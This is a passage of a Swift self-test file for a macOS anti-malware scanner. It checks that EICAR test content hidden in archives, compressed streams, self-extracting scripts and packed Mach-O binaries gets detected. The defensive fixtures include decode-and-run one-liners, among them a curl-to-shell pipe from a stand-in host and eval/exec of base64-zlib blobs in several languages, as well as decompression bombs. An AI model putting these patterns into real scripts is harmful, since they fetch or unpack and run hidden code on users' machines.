import Foundation
import Compression
import RampartShared
import RampartEngine

// Compressed / runtime-unpacked payload hardening (agent CX1).
// Every fixture is generated at test time inside one temp dir that is deleted at the end; the only
// "malicious" content is the EICAR test string (assembled at runtime) or harmless com.rampart.test markers.
extension SelfTest {
    /// Per-user Darwin temp dir (/private/var/folders/…/T/, ignoring $TMPDIR). Real-time protection skips it and
    /// quick scans don't cover it, so EICAR fixtures written here never show up in the installed RamPart's
    /// detections (fixtures under /private/tmp/claude-501 did).
    static var fixtureTempDir: String { ArchiveUnpacker.darwinUserTempDir }

    static func compressChecks() {
        // Optional read-only false-positive sweep: RAMPART_CX_FPSCAN="/usr/bin:/Library/Developer" prints any finding from the new rules.
        if let roots = ProcessInfo.processInfo.environment["RAMPART_CX_FPSCAN"] {
            var o = ScanOptions(); o.useCache = false; o.unpackDiskImages = false; o.triage = false
            let c = ScanCoordinator(database: nil, options: o)
            let r = c.scan(paths: roots.split(separator: ":").map(String.init))
            let mine: Set<String> = [ContainerRisk.noteTitle, ContainerRisk.encryptedTitle, ContainerRisk.bombTitle, EmbeddedPayload.decodeRunTitle,
                                     EmbeddedPayload.appendedTitle, EmbeddedPayload.selfExtractTitle, PackedMachODetector.title]
            for d in r.detections where d.evidence.contains(where: { mine.contains($0.title) }) {
                print("FPSCAN \(d.confidence) \(d.name) \(d.path ?? "-") :: \(d.evidence.first?.detail.prefix(160) ?? "")")
            }
            print("FPSCAN scanned \(r.scanned) files, \(r.detections.count) detections")
        }
        let fm = FileManager.default
        let runID = "cx-\(getpid())-\(UUID().uuidString.prefix(8))"
        let work = fixtureTempDir + "com.rampart.test.\(runID)"
        try? fm.createDirectory(atPath: work, withIntermediateDirectories: true)
        defer { try? fm.removeItem(atPath: work) }
        let unpackRoot = ArchiveUnpacker.defaultTempRoot
        let unpackBefore = Set((try? fm.contentsOfDirectory(atPath: unpackRoot)) ?? [])

        let eicar = Data(EICAR.bytes)
        var opts = ScanOptions(); opts.useCache = false; opts.unpackDiskImages = false
        let coord = ScanCoordinator(database: nil, options: opts)
        func p(_ name: String) -> String { work + "/" + name }
        func write(_ name: String, _ d: Data, mode: Int = 0o644) -> String {
            let path = p(name); fm.createFile(atPath: path, contents: d, attributes: [.posixPermissions: mode]); return path
        }
        func sh(_ tool: String, _ args: [String], cwd: String? = nil) -> Int32 {
            let pr = Process(); pr.executableURL = URL(fileURLWithPath: tool); pr.arguments = args
            if let cwd { pr.currentDirectoryURL = URL(fileURLWithPath: cwd) }
            pr.standardOutput = FileHandle.nullDevice; pr.standardError = FileHandle.nullDevice; pr.standardInput = FileHandle.nullDevice
            do { try pr.run() } catch { return -1 }
            pr.waitUntilExit(); return pr.terminationStatus
        }
        func scan(_ path: String, _ o: ScanOptions? = nil) -> Detection? { coord.scanFile(at: path, options: o).detection }
        func hasEICAR(_ d: Detection?) -> Bool { d?.evidence.contains { $0.title == EICAR.detectionName } == true }
        func has(_ d: Detection?, _ title: String) -> Bool { d?.evidence.contains { $0.title == title } == true }
        func encode(_ d: Data, _ alg: compression_algorithm) -> Data {
            let dst = UnsafeMutablePointer<UInt8>.allocate(capacity: d.count + 4096); defer { dst.deallocate() }
            let n = d.withUnsafeBytes { compression_encode_buffer(dst, d.count + 4096, $0.bindMemory(to: UInt8.self).baseAddress!, d.count, nil, alg) }
            return Data(bytes: dst, count: n)
        }
        func gzipData(_ d: Data) -> Data {
            let src = write("gz-src-\(UUID().uuidString.prefix(6))", d)
            let pr = Process(); pr.executableURL = URL(fileURLWithPath: "/usr/bin/gzip"); pr.arguments = ["-c", "-n", src]
            let out = Pipe(); pr.standardOutput = out
            try? pr.run(); let data = out.fileHandleForReading.readDataToEndOfFile(); pr.waitUntilExit()
            try? fm.removeItem(atPath: src); return data
        }
        let zlibEICAR = Data([0x78, 0x9C]) + encode(eicar, COMPRESSION_ZLIB)

        // MARK: 1. Magic-byte format detection (extension ignored)
        func hdr(_ b: [UInt8]) -> [UInt8] { b + [UInt8](repeating: 0x41, count: 600) }
        let magics: [(String, [UInt8], ArchiveFormat)] = [
            ("gzip", [0x1F, 0x8B, 0x08], .gzip), ("bzip2", Array("BZh91AY".utf8), .bzip2), ("xz", [0xFD, 0x37, 0x7A, 0x58, 0x5A, 0x00], .xz),
            ("zstd", [0x28, 0xB5, 0x2F, 0xFD], .zstd), ("7z", [0x37, 0x7A, 0xBC, 0xAF, 0x27, 0x1C], .sevenZip), ("rar", Array("Rar!\u{1A}\u{07}\u{01}".utf8), .rar),
            ("cpio newc", Array("070701".utf8), .cpio), ("cpio odc", Array("070707".utf8), .cpio), (".Z", [0x1F, 0x9D, 0x90], .compressZ),
            ("lz4", [0x04, 0x22, 0x4D, 0x18], .lz4), ("aa", Array("AA01".utf8), .appleArchive), ("aa lzfse", Array("pbze".utf8), .appleArchive),
            ("xar", Array("xar!".utf8), .xar),
        ]
        for (n, m, f) in magics { check(ArchiveFormat.detect(header: hdr(m), path: "/x/blob.dat") == f, "cx: magic \(n) detected by content") }
        check(ArchiveFormat.detect(header: [UInt8](zlibEICAR) + [UInt8](repeating: 0, count: 40)) == .zlib, "cx: zlib blob detected (trial inflate)")
        check(ArchiveFormat.detect(header: Array("x\u{9C}this is just text that happens to start with x".utf8)) != .zlib, "cx: text starting 'x\\x9c' is not zlib")
        for (n, m, _) in magics where [".Z", "lz4", "aa", "cpio newc"].contains(n) {
            check(FileSniffer.kind(header: hdr(m), path: "/x/blob.dat") == .archive, "cx: sniffer marks \(n) as archive")
        }

        // MARK: 2. Single compressed streams and more archive formats, with EICAR inside, misleading names
        let src = work + "/src"; try? fm.createDirectory(atPath: src, withIntermediateDirectories: true)
        fm.createFile(atPath: src + "/com.rampart.test.inner.com", contents: eicar)
        fm.createFile(atPath: src + "/README.txt", contents: Data("com.rampart.test harmless readme\n".utf8))
        let rawEicar = write("com.rampart.test.raw.com", eicar)
        let gz = write("com.rampart.test.photo.jpg", gzipData(eicar))
        check(hasEICAR(scan(gz)), "cx: EICAR in a single gzip stream named .jpg")
        if sh("/bin/sh", ["-c", "/usr/bin/bzip2 -c \"$0\" > \"$1\"", rawEicar, p("com.rampart.test.bz.dat")]) == 0 {
            check(hasEICAR(scan(p("com.rampart.test.bz.dat"))), "cx: EICAR in a bzip2 stream")
        }
        if sh("/bin/sh", ["-c", "/usr/bin/compress -c \"$0\" > \"$1\"", rawEicar, p("com.rampart.test.unixz")]) == 0 {
            check(hasEICAR(scan(p("com.rampart.test.unixz"))), "cx: EICAR in a .Z (compress) stream")
        }
        let xz = write("com.rampart.test.blob", encode(eicar, COMPRESSION_LZMA))
        check(ArchiveFormat.detect(header: ArchiveUnpackerTestHook.header(xz)) == .xz, "cx: xz fixture is xz")
        check(hasEICAR(scan(xz)), "cx: EICAR in an xz stream")
        let zl = write("com.rampart.test.zl.bin", zlibEICAR + Data(repeating: 0, count: 4))
        check(hasEICAR(scan(zl)), "cx: EICAR in a zlib-wrapped blob")
        // gzip of a zip of EICAR (two layers).
        let z1 = p("com.rampart.test.l1.zip")
        _ = sh("/usr/bin/ditto", ["-c", "-k", src, z1])
        let gzz = write("com.rampart.test.l2.bin", gzipData(fm.contents(atPath: z1) ?? Data()))
        check(hasEICAR(scan(gzz)), "cx: EICAR in gzip(zip) layers")
        for (name, args) in [("com.rampart.test.t.txz", ["-cJf"]), ("com.rampart.test.t.7z.dat", ["--format", "7zip", "-cf"]),
                             ("com.rampart.test.t.cpio", ["--format", "cpio", "-cf"]), ("com.rampart.test.t.newc", ["--format", "newc", "-cf"]),
                             ("com.rampart.test.t.xar", ["--format", "xar", "-cf"]), ("com.rampart.test.t.tbz", ["-cjf"])] {
            if sh("/usr/bin/tar", args + [p(name), "-C", src, "."]) == 0 {
                check(hasEICAR(scan(p(name))), "cx: EICAR inside \(name)")
            } else { print("note: tar could not create \(name); skipped") }
        }
        if FileManager.default.isExecutableFile(atPath: "/usr/bin/aa"),
           sh("/usr/bin/aa", ["archive", "-d", src, "-o", p("com.rampart.test.t.aar")]) == 0 {
            check(hasEICAR(scan(p("com.rampart.test.t.aar"))), "cx: EICAR inside an Apple Archive (.aar)")
        }

        // MARK: 3. Containers we can't open are never silently clean
        let low = Scoring.logThreshold
        let encSrc = work + "/enc"; try? fm.createDirectory(atPath: encSrc, withIntermediateDirectories: true)
        fm.createFile(atPath: encSrc + "/com.rampart.test.notes.txt", contents: Data("harmless\n".utf8))
        let encPlain = p("com.rampart.test.enc.zip")
        if sh("/usr/bin/zip", ["-q", "-P", "pw", encPlain, "com.rampart.test.notes.txt"], cwd: encSrc) == 0 {
            let d = scan(encPlain)
            check(has(d, ContainerRisk.encryptedTitle), "cx: password zip gets a 'couldn't look inside' note")
            check((d?.confidence ?? 0) >= low && (d?.confidence ?? 100) < Scoring.alertThreshold && d?.severity == .low,
                  "cx: plain password zip is low severity (\(d?.confidence ?? -1))")
            fm.createFile(atPath: encSrc + "/Invoice.pdf.command", contents: Data("#!/bin/sh\necho com.rampart.test\n".utf8))
            let encRisky = p("com.rampart.test.risky.zip")
            _ = sh("/usr/bin/zip", ["-q", "-P", "pw", encRisky, "Invoice.pdf.command"], cwd: encSrc)
            let dr = scan(encRisky)
            check((dr?.confidence ?? 0) > (d?.confidence ?? 0) && dr?.evidence.first?.detail.contains("Invoice.pdf.command") == true,
                  "cx: password zip listing a program scores higher (\(dr?.confidence ?? -1))")
            let mailed = p("com.rampart.test.mailed.zip")
            try? fm.copyItem(atPath: encRisky, toPath: mailed)
            let qv = Array("0081;6543210a;Mail;".utf8); _ = setxattr(mailed, "com.apple.quarantine", qv, qv.count, 0, 0)
            let dm = scan(mailed)
            check((dm?.confidence ?? 0) >= Scoring.alertThreshold && dm?.evidence.first?.detail.contains("Mail") == true,
                  "cx: password zip with a program, sent by Mail, alerts (\(dm?.confidence ?? -1))")
            check((dm?.confidence ?? 100) < Scoring.quarantineThreshold, "cx: unscannable archive alone never auto-quarantines")
        } else { print("note: /usr/bin/zip unavailable; password-zip checks skipped") }

        let goodZip = fm.contents(atPath: z1) ?? Data()
        let trunc = write("com.rampart.test.trunc.zip", goodZip.prefix(max(40, goodZip.count / 2)))
        let dt = scan(trunc)
        check(dt != nil && dt!.evidence.contains { $0.title == ContainerRisk.noteTitle || $0.title == ContainerRisk.encryptedTitle },
              "cx: truncated zip gets a note")
        let zst = write("com.rampart.test.blob.zst", Data([0x28, 0xB5, 0x2F, 0xFD]) + Data(repeating: 0x11, count: 300))
        check(scan(zst) == nil, "cx: local zstd stream (e.g. inside a .blend) stays quiet")
        let qz = Array("0081;6543210a;Safari;".utf8); _ = setxattr(zst, "com.apple.quarantine", qz, qz.count, 0, 0)
        check(scan(zst)?.evidence.first?.detail.contains("zstd") == true, "cx: downloaded zstd stream (no Apple decompressor) is reported, not clean")
        check(ContainerRisk.isSplitPart("Deepfield-6.4-86.ipa.part00") && ContainerRisk.isSplitPart("a.zip.001") && ContainerRisk.isSplitPart("a.z01")
              && !ContainerRisk.isSplitPart("a.zip"), "cx: split-archive part names")
        let part = write("com.rampart.test.app.ipa.part00", goodZip.prefix(max(40, goodZip.count / 2)))
        check(scan(part) == nil, "cx: truncated split-archive part stays quiet")
        let rar = write("com.rampart.test.x.rar", Data("Rar!\u{1A}\u{07}\u{00}".utf8) + Data(repeating: 0x33, count: 200))
        check(has(scan(rar), ContainerRisk.noteTitle), "cx: corrupt RAR gets a note")
        let badGz = write("com.rampart.test.bad.gz", Data([0x1F, 0x8B, 0x08, 0x00]) + Data(repeating: 0xEE, count: 300))
        check(has(scan(badGz), ContainerRisk.noteTitle), "cx: corrupt gzip gets a note")
        // Bombs (small limits so the test stays fast).
        var tight = opts; tight.archiveLimits.maxExpandedBytes = 1 << 20; tight.archiveLimits.maxRatio = 50
        let zeros = write("com.rampart.test.zeros.bin", Data(repeating: 0, count: 3 << 20))
        let bombZip = p("com.rampart.test.bomb.zip")
        _ = sh("/usr/bin/ditto", ["-c", "-k", zeros, bombZip])
        check(has(scan(bombZip, tight), ContainerRisk.bombTitle), "cx: zip bomb refused and reported")
        let bombGz = write("com.rampart.test.bomb.gz", gzipData(fm.contents(atPath: zeros) ?? Data()))
        check(has(scan(bombGz, tight), ContainerRisk.bombTitle), "cx: gzip bomb stopped at the cap and reported")
        let bombTar = p("com.rampart.test.bomb.tgz")
        _ = sh("/usr/bin/tar", ["-czf", bombTar, "-C", work, "com.rampart.test.zeros.bin"])
        check(has(scan(bombTar, tight), ContainerRisk.bombTitle), "cx: tar.gz bomb reported")
        try? fm.removeItem(atPath: zeros)
        // Too deep: zip(zip(zip(EICAR))) with maxDepth 2.
        var shallow = opts; shallow.archiveLimits.maxDepth = 2
        let deepDir = work + "/deep"; try? fm.createDirectory(atPath: deepDir, withIntermediateDirectories: true)
        var cur = z1
        for i in 0..<3 {
            let d = deepDir + "/l\(i)"; try? fm.createDirectory(atPath: d, withIntermediateDirectories: true)
            try? fm.copyItem(atPath: cur, toPath: d + "/inner\(i).zip")
            let next = deepDir + "/com.rampart.test.deep\(i).zip"; _ = sh("/usr/bin/ditto", ["-c", "-k", d, next]); cur = next
        }
        let dd = scan(cur, shallow)
        check(dd != nil && dd!.evidence.contains { $0.detail.contains("nested inside too many") }, "cx: over-depth nesting is reported, not clean")
        let ddef = scan(cur)
        check(ddef != nil && ddef!.evidence.contains { $0.detail.contains("nested inside too many") }, "cx: 4-level nesting past the default depth 3 is reported")
        // Risk helpers.
        check(ContainerRisk.hasDoubleExtension("Invoice.pdf.zip") && ContainerRisk.hasDoubleExtension("photo.jpg .app")
              && !ContainerRisk.hasDoubleExtension("archive.tar.gz") && !ContainerRisk.hasDoubleExtension("v1.2.3.zip"), "cx: double-extension rule")
        check(ContainerRisk.riskyMembers(["a/Setup.app/Contents/MacOS/Setup", "a/Setup.app/Contents/Info.plist", "doc.txt", "run.command"]) == ["a/Setup.app", "run.command"],
              "cx: risky member names (app bundle counted once)")
        let corrupt = ContainerUnreadable(reason: .corrupt, format: .zip, detail: "x")
        check(ContainerRisk.evidence(for: corrupt, displayPath: "/Library/Developer/CommandLineTools/usr/lib/python3/test/bad.zip", origin: .init()) == nil,
              "cx: toolchain test corpora stay quiet")
        check(ContainerRisk.evidence(for: corrupt, displayPath: "/opt/homebrew/Cellar/x/1.0/share/broken.tar.gz", origin: .init()) == nil, "cx: Homebrew Cellar stays quiet")
        check(ContainerRisk.evidence(for: corrupt, displayPath: "/System/Library/x.zip", origin: .init(quarantined: true, agent: "Safari")) != nil,
              "cx: a downloaded archive is reported even in a quiet folder")
        check(ContainerRisk.evidence(for: ContainerUnreadable(reason: .tooDeep, format: .zip, detail: "x"), displayPath: "/Users/u/lib/app.jar!/a.jar!/b.jar", origin: .init()) == nil,
              "cx: deeply nested jars are normal")

        // MARK: 4. Benign archives and installers stay clean
        let proj = work + "/hello-1.0"; try? fm.createDirectory(atPath: proj + "/src", withIntermediateDirectories: true)
        fm.createFile(atPath: proj + "/configure", contents: Data("#!/bin/sh\n# com.rampart.test configure\necho checking for cc... cc\nprintf 'all:\\n\\tcc -o hello src/hello.c\\n' > Makefile\nexit 0\n".utf8), attributes: [.posixPermissions: 0o755])
        fm.createFile(atPath: proj + "/src/hello.c", contents: Data("#include <stdio.h>\nint main(void){puts(\"hi\");return 0;}\n".utf8))
        fm.createFile(atPath: proj + "/install.sh", contents: Data("#!/bin/bash\nset -e\ncurl -fsSL https://example.test/v.tar.gz | tar -xz -C \"$HOME/.local\"\necho \"$TOKEN\" | base64 -d > \"$HOME/.config/tok\"\n".utf8), attributes: [.posixPermissions: 0o755])
        let srcTgz = p("hello-1.0.tar.gz")
        _ = sh("/usr/bin/tar", ["-czf", srcTgz, "-C", work, "hello-1.0"])
        check(scan(srcTgz) == nil, "cx: normal source tarball is clean")
        let whl = work + "/whl"; try? fm.createDirectory(atPath: whl + "/pkg-1.0.dist-info", withIntermediateDirectories: true)
        try? fm.createDirectory(atPath: whl + "/pkg", withIntermediateDirectories: true)
        fm.createFile(atPath: whl + "/pkg/__init__.py", contents: Data("import zlib, base64\nDATA = zlib.decompress(base64.b64decode(b'eJzLSM3JyQcABiwCFQ=='))\ndef hello():\n    return DATA\n".utf8))
        fm.createFile(atPath: whl + "/pkg-1.0.dist-info/METADATA", contents: Data("Name: pkg\nVersion: 1.0\n".utf8))
        let wheel = p("pkg-1.0-py3-none-any.whl")
        _ = sh("/usr/bin/ditto", ["-c", "-k", whl, wheel])
        check(scan(wheel) == nil, "cx: Python wheel (zlib data, no exec) is clean")
        let bottle = work + "/bottle/tool/1.0/bin"; try? fm.createDirectory(atPath: bottle, withIntermediateDirectories: true)
        try? fm.copyItem(atPath: "/usr/bin/true", toPath: bottle + "/tool")
        let bottleTgz = p("tool--1.0.arm64_sequoia.bottle.tar.gz")
        _ = sh("/usr/bin/tar", ["-czf", bottleTgz, "-C", work + "/bottle", "tool"])
        check(scan(bottleTgz) == nil, "cx: Homebrew-style bottle is clean")
        // Self-extracting installer (makeself style): payload unpacked to a tar, not piped to a shell.
        let benignTgz = fm.contents(atPath: srcTgz) ?? Data()
        let makeself = Data("#!/bin/sh\n# com.rampart.test self-extracting installer\nTMP=$(mktemp -d)\ntail -n +6 \"$0\" | gzip -cd | tar -xf - -C \"$TMP\"\n\"$TMP/hello-1.0/configure\"; exit 0\n".utf8) + benignTgz
        let ms = write("com.rampart.test.installer.run", makeself, mode: 0o755)
        let dms = scan(ms)
        check(dms == nil, "cx: benign self-extracting installer is clean (\(dms?.name ?? "-"))")
        let r0 = EmbeddedPayload.analyze(path: ms, size: UInt64(makeself.count), cap: 64 << 20)
        check(r0.payloads.first?.data.prefix(2) == Data([0x1F, 0x8B]) && r0.evidence.first?.title == EmbeddedPayload.selfExtractTitle,
              "cx: self-extractor payload located from `tail -n +6 \"$0\"`")
        // EICAR in the self-extractor's payload is found.
        let evilTgz = p("com.rampart.test.evil.tgz"); _ = sh("/usr/bin/tar", ["-czf", evilTgz, "-C", src, "."])
        let msBad = write("com.rampart.test.installer2.run", makeself.prefix(makeself.count - benignTgz.count) + (fm.contents(atPath: evilTgz) ?? Data()), mode: 0o755)
        check(hasEICAR(scan(msBad)), "cx: EICAR inside a self-extracting script's appended tar.gz is detected")
        // Apple-signed binaries: not packed.
        for b in ["/bin/ls", "/usr/bin/true", "/usr/bin/ditto"] {
            if let a = PackedMachODetector.analyze(path: b) { check(!a.isPacked && a.hasCodeSignature, "cx: \(b) is not packed") }
        }
        if let me = Bundle.main.executablePath, let a = PackedMachODetector.analyze(path: me) { check(!a.isPacked, "cx: the selftest binary itself is not packed") }

        // MARK: 5. Runtime-unpack scripts
        let b64gzEICAR = gzipData(eicar).base64EncodedString()
        let b64zlEICAR = zlibEICAR.base64EncodedString()
        let s1 = write("com.rampart.test.s1.sh", Data("#!/bin/sh\necho \(b64gzEICAR) | base64 -d | gunzip | bash\n".utf8), mode: 0o755)
        let d1 = scan(s1)
        check(has(d1, EmbeddedPayload.decodeRunTitle) && hasEICAR(d1), "cx: `base64 -d | gunzip | bash` flagged and its payload scanned")
        let payloadScript = Data("#!/bin/sh\necho com.rampart.test second stage\n".utf8)
        let s2 = write("com.rampart.test.s2.command", Data("#!/bin/sh\ntail -n +4 \"$0\" | gunzip | sh\nexit 0\n".utf8) + gzipData(payloadScript), mode: 0o755)
        let d2 = scan(s2)
        check(has(d2, EmbeddedPayload.decodeRunTitle) && (d2?.confidence ?? 0) >= 50, "cx: `tail -n +N \"$0\" | gunzip | sh` flagged (\(d2?.confidence ?? -1))")
        check(d2?.evidence.first { $0.title == EmbeddedPayload.decodeRunTitle }?.detail.contains("extracted") == true, "cx: explanation says the payload was extracted")
        let s2e = write("com.rampart.test.s2e.sh", Data("#!/bin/sh\ntail -n +4 \"$0\" | gunzip | sh\nexit 0\n".utf8) + gzipData(eicar), mode: 0o755)
        check(hasEICAR(scan(s2e)), "cx: EICAR appended after `exit` is extracted and detected")
        let s3 = write("com.rampart.test.s3.sh", Data("#!/bin/bash\neval \"$(echo \(eicar.base64EncodedString()) | base64 --decode)\"\n".utf8))
        let d3 = scan(s3)
        check(has(d3, EmbeddedPayload.decodeRunTitle) && hasEICAR(d3), "cx: eval \"$(… | base64 --decode)\" flagged and decoded")
        // uuencode
        let uu = uuencode(eicar, name: "x")
        let s4 = write("com.rampart.test.s4.sh", Data("#!/bin/sh\nuudecode -o /dev/stdout \"$0\" | sh\nexit 0\n\(uu)".utf8))
        let d4 = scan(s4)
        check(hasEICAR(d4), "cx: uuencoded block in a script is decoded and scanned")
        check(EmbeddedPayload.uudecodeForTest(uu) == eicar, "cx: uudecode round trip")
        // Marker + sed
        let s5 = write("com.rampart.test.s5.sh", Data("#!/bin/sh\nsed '1,/^__PAYLOAD_BELOW__$/d' \"$0\" | tar -xz -C /tmp/x && /tmp/x/run\nexit 0\n__PAYLOAD_BELOW__\n".utf8) + (fm.contents(atPath: evilTgz) ?? Data()))
        check(hasEICAR(scan(s5)), "cx: payload after an __PAYLOAD_BELOW__ marker is extracted and scanned")
        // Downloaded blob: pattern only.
        let s6 = write("com.rampart.test.s6.sh", Data("#!/bin/sh\ncurl -fsSL https://example.test/p | base64 -D | gunzip | sh\n".utf8))
        let d6 = scan(s6)
        check(has(d6, EmbeddedPayload.decodeRunTitle) && d6?.evidence.first?.detail.contains("comes from elsewhere") == true, "cx: downloaded decode-and-run pipe flagged")
        // Python / JS / Ruby / Perl / AppleScript.
        let py = write("com.rampart.test.p.py", Data("import zlib, base64\nexec(zlib.decompress(base64.b64decode('\(b64zlEICAR)')))\n".utf8))
        let dpy = scan(py)
        check(has(dpy, EmbeddedPayload.decodeRunTitle) && hasEICAR(dpy) && (dpy?.confidence ?? 0) >= Scoring.alertThreshold, "cx: Python exec(zlib.decompress(b64decode())) flagged + payload scanned (\(dpy?.confidence ?? -1))")
        let py2 = write("com.rampart.test.p2.py", Data("import base64, marshal\ncode = marshal.loads(base64.b64decode(BLOB))\nprint('x')\nexec(code)\n".utf8))
        check(has(scan(py2), EmbeddedPayload.decodeRunTitle), "cx: Python two-step decode then exec flagged")
        let js = write("com.rampart.test.j.js", Data("const z=require('zlib');eval(z.inflateSync(Buffer.from('\(b64zlEICAR)','base64')).toString());\n".utf8))
        let djs = scan(js)
        check(has(djs, EmbeddedPayload.decodeRunTitle) && hasEICAR(djs), "cx: JS eval(inflateSync(Buffer.from(b64))) flagged + scanned")
        let rb = write("com.rampart.test.r.rb", Data("require 'zlib'; require 'base64'\neval(Zlib::Inflate.inflate(Base64.decode64('\(b64zlEICAR)')))\n".utf8))
        check(has(scan(rb), EmbeddedPayload.decodeRunTitle), "cx: Ruby eval(Zlib::Inflate(Base64)) flagged")
        let pl = write("com.rampart.test.x.pl", Data("use Compress::Zlib; use MIME::Base64;\neval(uncompress(decode_base64('\(b64zlEICAR)')));\n".utf8))
        check(has(scan(pl), EmbeddedPayload.decodeRunTitle), "cx: Perl eval(uncompress(decode_base64)) flagged")
        let asc = write("com.rampart.test.a.applescript", Data("do shell script \"echo \(b64gzEICAR) | base64 -D | gunzip | sh\"\n".utf8))
        let das = scan(asc)
        check(has(das, EmbeddedPayload.decodeRunTitle) && hasEICAR(das), "cx: AppleScript do shell script decode pipe flagged + scanned")
        // Benign look-alikes.
        let benignScripts: [(String, String)] = [
            ("b1.py", "import zlib, base64, json\ncfg = json.loads(zlib.decompress(base64.b64decode(DATA)))\nprint(cfg)\n"),
            ("b2.py", "import base64\nassert base64.b64decode('aGk=') == b'hi'\nexec(compile(open(__file__).read(), __file__, 'exec'))\n"),
            ("b3.sh", "#!/bin/sh\ngunzip -c data.tar.gz | tar xf -\nzcat /usr/share/doc/x.gz | less\necho \"$SECRET\" | base64 --decode > key\nsed -n 's/^## //p' \"$0\"\n"),
            ("b4.js", "const zlib=require('zlib');const out=zlib.inflateSync(buf);console.log(eval('1+1'), out.length);\neval(\"var inflate = 1\");\n"),
            ("b5.rb", "require 'base64'\nputs Base64.decode64(ARGV[0])\n"),
        ]
        for (n, body) in benignScripts {
            let path = write("com.rampart.test.\(n)", Data(body.utf8), mode: 0o755)
            let d = scan(path)
            check(d == nil, "cx: benign script \(n) is clean (\(d?.name ?? "-"))")
        }

        // MARK: 6. Packed Mach-O
        func machO(text: Data, marker: Bool, signature: Bool) -> Data {
            var h = Data()
            func u32(_ v: UInt32) { withUnsafeBytes(of: v.littleEndian) { h.append(contentsOf: $0) } }
            func u64(_ v: UInt64) { withUnsafeBytes(of: v.littleEndian) { h.append(contentsOf: $0) } }
            func name(_ s: String) { var b = Array(s.utf8); b += [UInt8](repeating: 0, count: 16 - b.count); h.append(contentsOf: b) }
            let ncmds: UInt32 = signature ? 3 : 2
            let segSize: UInt32 = 72 + 80, dylibSize: UInt32 = 56, sigSize: UInt32 = 16
            u32(0xFEEDFACF); u32(0x0100000C); u32(0); u32(2); u32(ncmds); u32(segSize + dylibSize + (signature ? sigSize : 0)); u32(0); u32(0)
            u32(0x19); u32(segSize); name("__TEXT"); u64(0x1_0000_0000); u64(UInt64(4096 + text.count)); u64(0); u64(UInt64(4096 + text.count)); u32(5); u32(5); u32(1); u32(0)
            name("__text"); name("__TEXT"); u64(0x1_0000_1000); u64(UInt64(text.count)); u32(4096); u32(0); u32(0); u32(0); u32(0x80000400); u32(0); u32(0); u32(0)
            u32(0xC); u32(dylibSize); u32(24); u32(0); u32(0); u32(0); var lib = Array("/usr/lib/libSystem.B.dylib".utf8); lib += [UInt8](repeating: 0, count: 32 - lib.count); h.append(contentsOf: lib)
            if signature { u32(0x1D); u32(sigSize); u32(0); u32(0) }
            if marker { h.append(contentsOf: Array("UPX!".utf8)) }
            h.append(Data(repeating: 0, count: 4096 - h.count))
            return h + text
        }
        var rng = SystemRandomNumberGenerator()
        let noise = Data((0..<32768).map { _ in UInt8.random(in: 0...255, using: &rng) })
        let lowEntropy = Data((0..<32768).map { UInt8(($0 / 7) % 23) })
        let packedPath = write("com.rampart.test.packed", machO(text: noise, marker: false, signature: false), mode: 0o755)
        let upxPath = write("com.rampart.test.upx", machO(text: lowEntropy, marker: true, signature: false), mode: 0o755)
        let plainPath = write("com.rampart.test.plain", machO(text: lowEntropy, marker: false, signature: true), mode: 0o755)
        check(FileSniffer.kind(path: packedPath) == .machO, "cx: synthetic Mach-O sniffs as Mach-O")
        let ap = PackedMachODetector.analyze(path: packedPath)
        check(ap?.isPacked == true && (ap?.textEntropy ?? 0) > 7.5 && ap?.hasCodeSignature == false, "cx: high-entropy __TEXT + tiny imports = packed")
        check(PackedMachODetector.analyze(path: upxPath)?.packerMarker == "UPX!", "cx: UPX! marker after load commands")
        check(PackedMachODetector.analyze(path: plainPath)?.isPacked == false, "cx: ordinary low-entropy Mach-O is not packed")
        let dpk = scan(packedPath)
        check(has(dpk, PackedMachODetector.title) && (dpk?.confidence ?? 0) >= Scoring.alertThreshold, "cx: unsigned packed binary in a user folder alerts (\(dpk?.confidence ?? -1))")
        let det = PackedMachODetector()
        let notarised = FileFacts(path: packedPath, size: 1, kind: .machO, isExecutable: true,
                                  signing: SigningInfo(status: .developerID, teamID: "TEAMID1234", notarized: true))
        check(det.inspect(notarised).isEmpty, "cx: notarised packed binary gets no packer evidence")
        check(scan(plainPath) == nil, "cx: plain synthetic Mach-O is clean")

        // MARK: 7. Extraction lineage: "runs only once unpacked"
        let dl = "/Users/someone/Downloads/com.rampart.test.tools.zip"
        let lin = ExtractionLineage(window: 600, quarantineCheck: { $0 == dl })
        let outDir = work + "/unz"; try? fm.createDirectory(atPath: outDir, withIntermediateDirectories: true)
        let extracted = outDir + "/com.rampart.test.run.com"
        fm.createFile(atPath: extracted, contents: eicar, attributes: [.posixPermissions: 0o755])
        let t0 = Date()
        let unzipProc = ProcessInfoLite(pid: 4100, ppid: 1, path: "/usr/bin/unzip", args: ["unzip", "-o", dl, "-d", outDir], isPlatformBinary: true)
        check(lin.observe(SecurityEvent(date: t0, kind: .exec, process: unzipProc, source: "test")) == nil, "cx: extraction exec recorded")
        lin.observe(SecurityEvent(date: t0.addingTimeInterval(1), kind: .fileCreate, process: unzipProc, path: extracted, source: "test"))
        let runner = ProcessInfoLite(pid: 4200, ppid: 4000, path: "/bin/sh", args: ["sh", extracted])
        let req = lin.observe(SecurityEvent(date: t0.addingTimeInterval(40), kind: .exec, process: runner, source: "test"))
        check(req?.path == extracted && req?.extraction.tool == "unzip", "cx: script run 40 s after unzip is flagged for an exec-time scan")
        check(req?.lineage.contains("com.rampart.test.tools.zip") == true && req?.lineage.contains("unzip") == true && req?.lineage.contains("40 s") == true,
              "cx: lineage names archive, tool and delay (\(req?.lineage ?? "-"))")
        if let req {
            let ev = lin.evidence(for: req)
            check(ev.score >= 40 && ev.title.contains("Gatekeeper"), "cx: downloaded archive unpacked by unzip (drops quarantine) then run = Gatekeeper bypass evidence")
            let d = lin.scanOnExec(req, coordinator: coord)
            check(hasEICAR(d) && d?.evidence.contains { $0.detail.contains("unpacked from") } == true && d?.pid == 4200, "cx: exec-time scan carries lineage in its explanation")
        }
        check(lin.observe(SecurityEvent(date: t0.addingTimeInterval(41), kind: .exec, process: runner, source: "test")) == nil, "cx: repeated exec is rate-limited")
        // Folder fallback (no file events), ditto.
        let dittoOut = work + "/dit"; try? fm.createDirectory(atPath: dittoOut, withIntermediateDirectories: true)
        let lin2 = ExtractionLineage(quarantineCheck: { _ in false })
        let t1 = Date()
        lin2.observe(SecurityEvent(date: t1.addingTimeInterval(-1), kind: .exec,
                                   process: ProcessInfoLite(pid: 5100, ppid: 1, path: "/usr/bin/ditto", args: ["ditto", "-x", "-k", work + "/a.zip", dittoOut]), source: "test"))
